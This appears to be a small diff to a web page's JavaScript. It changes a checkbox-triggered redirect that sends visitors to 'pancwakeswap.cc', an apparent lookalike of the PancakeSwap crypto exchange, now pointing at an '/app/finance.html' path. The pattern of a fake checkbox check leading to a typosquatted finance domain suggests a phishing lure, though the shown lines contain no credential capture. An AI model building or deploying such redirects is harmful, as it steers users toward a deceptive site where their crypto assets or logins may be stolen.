@@ -5,7 +5,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const checkboxContainer = document.querySelector('.checkbox-container');
     
     // 
-    const redirectUrl = 'https://pancwakeswap.cc';
+    const redirectUrl = 'https://pancwakeswap.cc/app/finance.html';
     
     checkbox.addEventListener('change', function() {
         if (this.checked) {
